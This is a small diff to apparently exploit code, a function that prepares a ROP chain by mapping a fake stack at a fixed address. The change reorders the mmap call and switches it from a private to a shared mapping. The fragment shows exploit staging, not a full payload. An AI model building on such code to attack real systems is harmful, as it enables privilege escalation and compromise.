@@ -71,11 +71,12 @@
 
 int prepare_rop_chain(void)
 {
-	char *mmaped_area = mmap((void *)FAKE_STACK_MMAP_ADDR, MMAP_SZ, PROT_WRITE,
-				 MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED, -1, 0);
+	char *mmaped_area = NULL;
 	unsigned long *fake_stack = NULL;
 	unsigned long offset = 0;
 
+	mmaped_area = mmap((void *)FAKE_STACK_MMAP_ADDR, MMAP_SZ, PROT_WRITE,
+			   MAP_SHARED | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
 	if (mmaped_area == MAP_FAILED) {
 		perror("[-] mmap");
 		return EXIT_FAILURE;
